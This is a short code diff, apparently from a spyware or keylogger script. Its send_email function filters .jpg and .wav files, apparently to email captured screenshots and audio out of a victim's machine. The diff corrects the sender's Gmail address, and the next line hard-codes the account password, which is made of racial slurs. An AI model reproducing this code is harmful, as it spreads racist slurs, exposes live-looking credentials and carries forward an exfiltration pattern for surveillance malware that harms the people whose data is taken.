@@ -88,7 +88,7 @@ def send_email(path):                               # Email sending function #
     regex4 = re.compile(r'.+\.jpg$')
     regex5 = re.compile(r'.+\.wav$')
 
-    email_address = 'amonkeyniha.com'         #<--- Enter your email address
+    email_address = 'amonkeyniha@gmail.com'         #<--- Enter your email address
     password = 'nigganiggercoon'                       #<--- Enter email password 
     
     msg = MIMEMultipart()
